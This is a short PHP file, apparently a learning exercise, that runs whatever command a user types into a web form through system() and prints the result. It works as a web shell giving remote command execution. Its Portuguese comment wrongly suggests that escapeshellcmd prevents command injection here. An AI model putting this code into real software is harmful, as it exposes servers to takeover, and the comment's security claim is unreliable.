<?php 

if ($_SERVER["REQUEST_METHOD"] === "POST"){

	$cmd = escapeshellcmd($_POST["cmd"]); // esse escape é para evitar injeção de comando no sistema quando vc usa o system

	var_dump($cmd);

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";	

}

?>
<form method="post">
	
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>

</form>
